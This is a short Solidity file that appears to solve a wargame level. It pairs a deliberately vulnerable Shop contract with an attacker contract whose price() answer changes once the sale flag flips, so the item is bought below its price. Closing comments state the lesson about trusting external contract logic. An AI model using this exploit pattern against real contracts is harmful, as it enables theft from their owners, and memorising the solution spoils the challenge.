// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBuyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    IBuyer _buyer = IBuyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract Bayer{
    Shop shop;

    constructor(Shop _shop){
        shop = _shop;
    }

    function price() external view returns (uint){
        return shop.isSold() ? 1 : 101; 
    }

    function buyItem() public{
        shop.buy();
    }
}


// Contracts can manipulate data seen by other contracts in any way they want.

// It's unsafe to change the state based on external and untrusted contracts logic.
